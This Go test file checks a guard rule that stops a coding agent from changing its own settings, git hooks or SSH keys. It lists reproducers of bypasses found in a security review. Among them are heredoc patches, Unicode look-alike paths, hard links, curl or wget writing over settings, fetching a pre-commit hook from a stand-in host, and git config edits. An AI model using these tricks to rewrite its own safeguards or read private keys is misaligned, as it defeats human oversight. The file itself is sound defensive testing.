package spaces

import (
	"encoding/json"
	"testing"
)

// TestSelfProtectionReviewCases holds the reproducers of the SP-042
// security review: each bypass it found is refused, and the ordinary calls
// it checked stay allowed.
func TestSelfProtectionReviewCases(t *testing.T) {
	f := newProtectFixture(t)
	h := f.home
	cl := h + "/.claude"
	refused := []string{
		// A heredoc patch, Codex's usual form.
		"apply_patch <<'EOF'\n*** Begin Patch\n*** Update File: " + cl + "/settings.json\n@@\n-a\n+b\n*** End Patch\nEOF",
		"apply_patch <<'EOF'\n*** Begin Patch\n*** Add File: .git/hooks/pre-commit\n+x\n*** End Patch\nEOF",
		// Unicode case folding: APFS takes the long s for s.
		"echo x > " + cl + "/ſettings.json",
		"cat " + h + "/.ſſh/id_rsa",
		// -t attached or in a cluster.
		"cp -t" + cl + " settings.json",
		"cp -vt " + cl + " settings.json",
		"mv -t" + cl + " settings.json",
		// A hard link writes the file under another name.
		"ln " + cl + "/settings.json /tmp/h",
		"cp -l " + cl + "/settings.json /tmp/h",
		// Writers with output flags.
		"curl -o " + cl + "/settings.json http://x",
		"curl -so" + cl + "/settings.json http://x",
		"wget -O " + cl + "/settings.json http://x",
		"wget --output-document=" + cl + "/settings.json http://x",
		"tar -xf x.tar -C " + cl,
		"cd " + cl + " && tar xf x.tar",
		"unzip x.zip -d .git/hooks",
		"cd .git/hooks && curl -O http://x/pre-commit",
		"patch " + cl + "/settings.json < p.diff",
		"tar czf " + h + "/.local/share/orch/orch.db src",
		// git's config runs commands through core.hooksPath and fsmonitor.
		"echo '[core]' >> .git/config",
		"X=" + cl + "; echo y > $X/settings.json",
		"echo x > " + h + "/.claude/../.claude/settings.json",
		"echo x > .git/HOOKS/pre-commit",
	}
	for _, cmd := range refused {
		if d := f.decide(bash(cmd)); d.Verdict != Refuse || d.Rule != RuleSelfProtection {
			t.Errorf("%q: %s (%s), want self_protection", cmd, d.Verdict, d.Rule)
		}
	}
	allowed := []string{
		"cat " + cl + "/settings.json",
		"sed -n 1,5p " + cl + "/settings.json",
		"ls " + h + "/*",
		"du -sh ~/*",
		"echo x > " + cl + "/CLAUDE.md",
		"mkdir -p " + cl + "/commands && cp a.md " + cl + "/commands/",
		"cat " + h + "/.ssh/known_hosts",
		"cat ~/.ssh/id_ed25519.pub",
		"ssh-keygen -y -f ~/.ssh/id_ed25519.pub",
		"tar czf /tmp/backup.tgz " + cl,
		"tar xf deps.tar",
		"curl -sSL http://x | head",
		"git add .claude/settings.json",
		"ln -s ../shared/config.yml config.yml",
	}
	for _, cmd := range allowed {
		if d := f.decide(bash(cmd)); d.Verdict != Allow {
			t.Errorf("%q: %s (%s), want allowed", cmd, d.Verdict, d.Rule)
		}
	}
	g, terms := mustProtect(t, f, "job[1].txt")
	if d := g.decide("Read", terms); d.Verdict != Refuse {
		t.Errorf("terms file with a bracket in its name: %s (%s)", d.Verdict, d.Rule)
	}
}

// mustProtect returns f with its policy rebuilt with a terms file named
// name, and a Read of that file.
func mustProtect(t *testing.T, f protectFixture, name string) (protectFixture, string) {
	t.Helper()
	env := testEnv()
	env.Home = f.home
	res, err := Validate(Policy{Spaces: []Space{
		{Name: "job", Kind: Isolated, Roots: []string{"~/code/job"}, TermsFile: "~/terms/" + name},
	}}, env)
	if err != nil {
		t.Fatal(err)
	}
	f.pol, err = NewGuardPolicyProtecting(res, ProtectedPaths(f.home, f.config, f.data, res))
	if err != nil {
		t.Fatal(err)
	}
	b, _ := json.Marshal(map[string]string{"file_path": f.home + "/terms/" + name})
	return f, string(b)
}
